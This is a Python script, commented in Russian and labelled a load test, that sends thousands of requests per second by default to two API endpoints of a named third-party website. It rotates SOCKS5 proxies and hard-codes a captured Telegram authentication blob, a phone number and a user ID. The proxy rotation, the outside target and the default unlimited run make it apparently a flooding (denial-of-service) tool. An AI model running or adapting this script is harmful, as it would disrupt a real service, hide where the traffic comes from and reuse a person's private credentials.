#!/usr/bin/env python3
import asyncio
import aiohttp
import json
import os
import time
import random
import signal
from datetime import datetime
from collections import defaultdict
from aiohttp_socks import ProxyConnector

# ========== НАСТРОЙКИ ==========
BASE_URL = "https://jameteam.com"
ENDPOINT1 = "/portals/api/log"
ENDPOINT2 = "/portals/api/browser_auth_sta"

RPS_TOTAL = int(os.getenv("RPS_TOTAL", "1000"))
RATIO1 = float(os.getenv("RATIO1", "0.5"))
DURATION = int(os.getenv("DURATION_SECONDS", "0"))
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "200"))
TIMEOUT = int(os.getenv("TIMEOUT", "5"))
PROXY_FILE = os.getenv("PROXY_FILE", "proxy.txt")
LOG_LEVEL = os.getenv("LOG_LEVEL", "full")   # full, compact, off

# ---------- PAYLOADs ----------
PAYLOAD1 = {
    "action": "app_opened",
    "bot_id": "3308",
    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22fuckyourmother%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
    "user": {
        "id": 632503732,
        "first_name": "👉🏻👌🏻🥵",
        "last_name": "",
        "username": "rekrut",
        "language_code": "ru",
        "is_premium": True,
        "allows_write_to_pm": True,
        "photo_url": "https://t.me/i/userpic/320/3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg"
    }
}

PAYLOAD2 = {
    "bot_id": "3308",
    "initData": "query_id=AAG0PbMlAAAAALQ9syWANX0a&user=%7B%22id%22%3A632503732%2C%22first_name%22%3A%22%F0%9F%91%89%F0%9F%8F%BB%F0%9F%91%8C%F0%9F%8F%BB%F0%9F%A5%B5%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22rekrut%22%2C%22language_code%22%3A%22ru%22%2C%22is_premium%22%3Atrue%2C%22allows_write_to_pm%22%3Atrue%2C%22photo_url%22%3A%22https%3A%5C%2F%5C%2Ft.me%5C%2Fi%5C%2Fuserpic%5C%2F320%5C%2F3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg%22%7D&auth_date=1777292794&signature=z6Nv9RzGnkCvtZU_v8A9Y2jfYjK3dIiZWXPJKfNHjjdzqkwr86IK28aNbcRLdPBxezitsqLQCE0TrKY34ojQBQ&hash=f63c469fdf06dd45b230cdfae26f5eacdc360b97fa89cc9b93812b40b2dd4262",
    "phone": "+79953200833",
    "user": {
        "id": 632503732,
        "first_name": "👉🏻👌🏻🥵",
        "last_name": "",
        "username": "rekrut",
        "language_code": "ru",
        "is_premium": True,
        "allows_write_to_pm": True,
        "photo_url": "https://t.me/i/userpic/320/3Rh7rfuUzLDv9psEiz8liMd9OP75rDao7HhypSIsBzY.svg"
    }
}

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "https://jameteam.com",
    "Referer": "https://jameteam.com/",
}

# ---------- Глобальные переменные ----------
running = True
stats = {
    "total": 0,
    "success": 0,
    "failed": 0,
    "by_endpoint": defaultdict(lambda: {"total": 0, "success": 0, "failed": 0, "times": []}),
    "statuses": defaultdict(int),
    "errors": defaultdict(int),
    "last_responses": []   # храним последние 5 ответов для вывода
}
proxies = []
proxy_index = 0
start_time = 0

def parse_proxy_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    if '@' in line:
        auth_part, host_part = line.split('@', 1)
        if ':' in auth_part:
            login, password = auth_part.split(':', 1)
        else:
            login, password = auth_part, ''
        return (f"socks5://{host_part}", login, password)
    else:
        return (f"socks5://{line}", None, None)

def load_proxies():
    global proxies
    proxies = []
    try:
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                parsed = parse_proxy_line(line)
                if parsed:
                    proxies.append(parsed)
        print(f"✅ Загружено прокси: {len(proxies)}")
    except FileNotFoundError:
        print(f"⚠️ Файл {PROXY_FILE} не найден. Работаем без прокси.")

def get_next_proxy():
    global proxy_index
    if not proxies:
        return None
    proxy = proxies[proxy_index % len(proxies)]
    proxy_index += 1
    return proxy

def get_endpoint_and_payload():
    if random.random() < RATIO1:
        return ENDPOINT1, PAYLOAD1
    else:
        return ENDPOINT2, PAYLOAD2

async def send_request(session, worker_id, req_id, proxy_info):
    endpoint, payload = get_endpoint_and_payload()
    url = BASE_URL + endpoint
    start = time.perf_counter()
    try:
        async with session.post(url, json=payload, headers=HEADERS, timeout=TIMEOUT) as resp:
            duration = (time.perf_counter() - start) * 1000
            status = resp.status
            body = await resp.text()
            # статистика
            stats["total"] += 1
            stats["by_endpoint"][endpoint]["total"] += 1
            stats["by_endpoint"][endpoint]["times"].append(duration)
            stats["statuses"][status] += 1
            if 200 <= status < 300:
                stats["success"] += 1
                stats["by_endpoint"][endpoint]["success"] += 1
            else:
                stats["failed"] += 1
                stats["by_endpoint"][endpoint]["failed"] += 1
                # сохраняем последние ответы с ошибками
                stats["last_responses"].append((status, body[:500]))
                if len(stats["last_responses"]) > 5:
                    stats["last_responses"].pop(0)

            # --- ЛОГИРОВАНИЕ ОТВЕТА СЕРВЕРА ---
            if LOG_LEVEL == "full":
                print(f"[{datetime.now():%H:%M:%S}] #{req_id} {endpoint} {status} {duration:.0f}ms")
                print(f"    Ответ: {body[:300]}{'...' if len(body)>300 else ''}")
            elif LOG_LEVEL == "compact":
                if status >= 400 or req_id % 10 == 0:
                    print(f"[{datetime.now():%H:%M:%S}] #{req_id} {endpoint} {status} {duration:.0f}ms | {body[:100]}")
            # else off — ничего

    except asyncio.TimeoutError:
        duration = (time.perf_counter() - start) * 1000
        stats["total"] += 1
        stats["failed"] += 1
        stats["by_endpoint"][endpoint]["failed"] += 1
        stats["errors"]["Timeout"] += 1
        if LOG_LEVEL != "off":
            print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {endpoint} TIMEOUT {duration:.0f}ms")
    except Exception as e:
        duration = (time.perf_counter() - start) * 1000
        stats["total"] += 1
        stats["failed"] += 1
        stats["by_endpoint"][endpoint]["failed"] += 1
        stats["errors"][type(e).__name__] += 1
        if LOG_LEVEL != "off" and stats["total"] % 50 == 0:
            print(f"[{datetime.now():%H:%M:%S}] ❌ #{req_id} {endpoint} {type(e).__name__} {duration:.0f}ms")

async def worker(worker_id, rate_per_sec):
    interval = 1.0 / rate_per_sec
    next_time = time.perf_counter()
    proxy_info = get_next_proxy()
    connector = None
    if proxy_info:
        proxy_url, login, password = proxy_info
        if login and password:
            connector = ProxyConnector.from_url(proxy_url, username=login, password=password)
        else:
            connector = ProxyConnector.from_url(proxy_url)
    else:
        connector = aiohttp.TCPConnector(limit=100)
    timeout = aiohttp.ClientTimeout(total=TIMEOUT)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while running:
            next_time += interval
            req_id = stats["total"] + 1
            await send_request(session, worker_id, req_id, proxy_info)
            sleep = next_time - time.perf_counter()
            if sleep > 0:
                await asyncio.sleep(sleep)
            else:
                next_time = time.perf_counter()

async def stats_reporter():
    last_total = 0
    last_time = time.perf_counter()
    while running:
        await asyncio.sleep(5)
        now = time.perf_counter()
        elapsed = now - start_time
        cur_total = stats["total"]
        if elapsed > 0 and cur_total > last_total:
            avg_rps = cur_total / elapsed
            cur_rps = (cur_total - last_total) / (now - last_time)
            success_rate = (stats["success"] / cur_total * 100) if cur_total else 0
            print(f"\n{'='*80}")
            print(f"[{datetime.now():%H:%M:%S}] ⏱️ {elapsed:.0f}с | Запросов: {cur_total:,} | RPS: {cur_rps:.1f} (ср:{avg_rps:.1f}) | Цель: {RPS_TOTAL}")
            print(f"✅ Успешно: {stats['success']:,} ({success_rate:.1f}%) | ❌ Ошибок: {stats['failed']:,}")
            for ep, data in stats["by_endpoint"].items():
                ep_total = data["total"]
                if ep_total:
                    ep_rate = data["success"] / ep_total * 100 if ep_total else 0
                    times = data["times"]
                    if times:
                        sorted_t = sorted(times[-500:])
                        p95 = sorted_t[int(len(sorted_t)*0.95)] if sorted_t else 0
                        print(f"   {ep}: {ep_total} запросов, успех {ep_rate:.1f}%, p95={p95:.0f}мс")
            # Покажем последние ответы с ошибками (если есть)
            if stats["last_responses"]:
                print("\n📦 Последние ответы с ошибками (статус, фрагмент тела):")
                for status, body_frag in stats["last_responses"][-3:]:
                    print(f"   {status}: {body_frag[:150]}")
            print(f"{'='*80}")
            last_total, last_time = cur_total, now

async def main():
    global running, start_time
    load_proxies()
    print("█" * 80)
    print("🔥 НАГРУЗОЧНЫЙ ТЕСТ с выводом ответов сервера (LOG_LEVEL={})".format(LOG_LEVEL))
    print(f"🎯 Эндпоинты: {ENDPOINT1} и {ENDPOINT2}")
    print(f"⚡ Общий RPS: {RPS_TOTAL} | Доля 1-го: {RATIO1*100:.0f}% | Воркеров: {MAX_WORKERS}")
    print(f"🔧 Прокси: {'загружены' if proxies else 'не используются'} (всего {len(proxies)} шт.)")
    print(f"⏱️  Таймаут: {TIMEOUT}с | Длительность: {'∞' if DURATION==0 else f'{DURATION}с'}")
    print("█" * 80)

    workers_cnt = min(MAX_WORKERS, max(10, RPS_TOTAL // 15))
    rate_per_worker = RPS_TOTAL / workers_cnt
    print(f"🔧 Активировано воркеров: {workers_cnt} | RPS на воркера: {rate_per_worker:.2f}\n")
    tasks = [asyncio.create_task(worker(i, rate_per_worker)) for i in range(workers_cnt)]
    tasks.append(asyncio.create_task(stats_reporter()))
    start_time = time.perf_counter()
    if DURATION > 0:
        await asyncio.sleep(DURATION)
        running = False
    await asyncio.gather(*tasks, return_exceptions=True)

def shutdown():
    global running
    running = False
    print("\n🛑 Останавливаем тест...")

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, shutdown)
        except NotImplementedError:
            pass
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        pass
    finally:
        elapsed = time.perf_counter() - start_time if start_time else 0
        print("\n" + "█" * 80)
        print("📊 ИТОГОВАЯ СТАТИСТИКА")
        print(f"⏰ Время: {elapsed:.1f}с")
        total = stats["total"]
        print(f"📨 Запросов: {total:,} | Средний RPS: {total/elapsed:.1f}")
        if total:
            print(f"✅ Успешно: {stats['success']:,} ({stats['success']/total*100:.1f}%) | ❌ Ошибок: {stats['failed']:,}")
            print("\nПо эндпоинтам:")
            for ep, data in stats["by_endpoint"].items():
                ep_total = data["total"]
                if ep_total:
                    avg_time = sum(data["times"]) / len(data["times"]) if data["times"] else 0
                    print(f"   {ep}: {ep_total} запросов, успех {data['success']}/{ep_total}, ср.время {avg_time:.0f}мс")
            print("\nСтатусы:", dict(sorted(stats["statuses"].items(), key=lambda x: x[1], reverse=True)[:10]))
            if stats["errors"]:
                print("Ошибки:", dict(stats["errors"]))
            if stats["last_responses"]:
                print("\nПримеры ответов с ошибками:")
                for status, body in stats["last_responses"][-3:]:
                    print(f"   [{status}] {body[:200]}")
        print("█" * 80)
        loop.close()
